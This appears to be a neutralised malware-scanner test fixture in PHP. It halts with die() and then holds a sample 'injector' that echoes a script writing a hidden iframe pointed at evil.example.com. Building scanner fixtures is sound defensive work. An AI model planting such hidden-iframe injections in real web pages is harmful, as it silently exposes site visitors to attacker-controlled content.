<?php die('LW-SCAN DEMO MALWARE - inert test fixture, does nothing'); ?>
<?php
// lw:0003 injector - document.write hidden iframe (infected)
echo '<script>document.write("<iframe src=\"//evil.example.com\" style=\"display:none\"></iframe>");</script>';
